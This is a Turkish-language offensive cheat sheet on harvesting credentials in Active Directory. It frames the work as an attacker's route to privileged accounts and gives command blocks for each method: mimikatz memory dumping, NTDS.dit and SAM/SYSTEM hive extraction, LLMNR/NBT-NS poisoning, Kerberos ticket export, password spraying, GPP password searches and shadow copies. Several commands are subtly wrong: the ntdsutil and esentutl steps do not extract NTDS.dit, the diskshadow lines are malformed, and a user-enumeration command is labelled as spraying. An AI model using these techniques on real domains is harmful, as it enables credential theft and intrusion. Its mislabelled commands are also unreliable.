# Active Directory Credential Gathering Rehberi

Bu rehberde, Active Directory (AD) ortamında credential toplama (kullanıcı adı ve şifre) yöntemleri detaylı bir şekilde açıklanmıştır. Her bir yöntem için kullanılan komutlar, araçlar ve bu komutların ne işe yaradıkları açıklanmıştır.

---

## 1. Giriş

Credential toplama, bir saldırganın Active Directory ortamında ilerlemesi için kritik bir adımdır. Bu süreçte, mevcut kullanıcı bilgilerinin yanı sıra yüksek ayrıcalıklı hesapların bilgileri de elde edilmeye çalışılır. Bu rehber, hem PowerShell hem de CMD tabanlı komutlar ve araçlar kullanılarak credential toplama yöntemlerini açıklamaktadır.

---

## 2. Metodoloji

### 2.1. Windows Credentials Dumping

#### `mimikatz`
**Amaç:** Bellekte saklanan kullanıcı adı ve şifre hashlerini toplar.

```cmd
privilege::debug
log
sekurlsa::logonpasswords
```

#### `rundll32 keymgr.dll,KRShowKeyMgr`
**Amaç:** Windows üzerinde saklanan şifreleri görüntüler.

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

---

### 2.2. NTDS.dit Dumping

#### `ntdsutil`
**Amaç:** NTDS.dit dosyasını yedekleyerek tüm Active Directory veritabanını alır.

```cmd
ntdsutil
activate instance ntds
datafile cleanup
```

#### `esentutl`
**Amaç:** NTDS.dit dosyasını çıkarır ve analiz eder.

```cmd
esentutl /p <path_to_ntds.dit>
```

---

### 2.3. LLMNR ve NBT-NS Poisoning

#### `Responder`
**Amaç:** LLMNR ve NBT-NS protokollerini kullanarak kimlik bilgisi toplar.

```bash
responder -I <network_interface>
```

#### `Inveigh`
**Amaç:** PowerShell ile LLMNR ve NBT-NS zehirleme saldırıları yapar.

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh
```

---

### 2.4. Kerberos Ticket Extraction

#### `klist`
**Amaç:** Mevcut Kerberos ticket bilgilerini listeler.

```cmd
klist
```

#### `Invoke-Mimikatz`
**Amaç:** Kerberos bileşenlerini ve biletlerini (TGT, TGS) dump eder.

```powershell
Invoke-Mimikatz -Command "kerberos::list /export"
```

---

### 2.5. Password Spraying

#### `crackmapexec`
**Amaç:** Bir kullanıcı adı ve şifre listesi ile domain üzerinde şifre denemesi yapar.

```bash
crackmapexec smb <target_ip> -u users.txt -p passwords.txt
```

#### `kerbrute`
**Amaç:** Kerberos üzerinden brute force ve password spraying yapar.

```bash
./kerbrute userenum -d <domain> userlist.txt
```

---

### 2.6. SAM ve SYSTEM Hive Dumping

#### `reg save`
**Amaç:** SAM ve SYSTEM hive dosyalarını yedekler.

```cmd
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

#### `secretsdump.py`
**Amaç:** SAM ve SYSTEM dosyalarını analiz ederek hashleri çıkarır.

```bash
python secretsdump.py -sam sam.save -system system.save LOCAL
```

---

### 2.7. Group Policy Preferences (GPP) Şifrelerini Toplama

#### `Get-GPPPassword`
**Amaç:** GPP dosyalarında saklanan şifreleri bulur.

```powershell
Get-GPPPassword
```

#### `findstr`
**Amaç:** SYSVOL'deki XML dosyalarını tarayarak GPP şifrelerini bulur.

```cmd
findstr /S /I /C:"password" \\\<domain>\SYSVOL
```

---

### 2.8. Credential Harvester

#### `Invoke-CredentialHarvest`
**Amaç:** PowerShell kullanarak açık oturumlardan kimlik bilgisi toplar.

```powershell
Invoke-CredentialHarvest
```

#### `quser`
**Amaç:** Hangi kullanıcıların açık oturumda olduğunu listeler.

```cmd
quser
```

---

### 2.9. SMB Share Enumeration ve Credential Extraction

#### `smbclient`
**Amaç:** Paylaşımları listeler ve credential içeren dosyaları bulur.

```bash
smbclient -L \\<target_ip>
```

#### `PowerView`
**Amaç:** SMB paylaşımlarını tarar ve analiz eder.

```powershell
Invoke-ShareFinder
```

---

### 2.10. Shadow Copy Dumping

#### `vssadmin`
**Amaç:** Shadow Copy'leri listeler ve NTDS.dit dosyasını çıkarır.

```cmd
vssadmin list shadows
```

#### `diskshadow`
**Amaç:** Shadow Copy oluşturur ve NTDS.dit dosyasını alır.

```cmd
diskshadow
exec create
exec expose
```

---

## 3. Araçlar ve Teknikler

### BloodHound
**Amaç:** Active Directory ortamında kimlik bilgisi ilişkilendirmelerini analiz eder.

```cmd
SharpHound.exe -c All
```

### Mimikatz
**Amaç:** Bellekteki kimlik bilgilerini çıkarır.

```cmd
sekurlsa::logonpasswords
```

### CrackMapExec
**Amaç:** Active Directory ortamında şifre denemesi ve hash çıkarma.

```bash
crackmapexec smb <target_ip>
```

---

## 4. Sonuç

Bu rehber, Active Directory ortamında credential toplama süreçlerinde kullanılan yöntemleri detaylı bir şekilde açıklamaktadır. Rehberdeki komut ve araçlar doğru uygulandığında, yüksek ayrıcalıklı hesaplara erişim sağlamak için kritik veriler elde edilebilir.
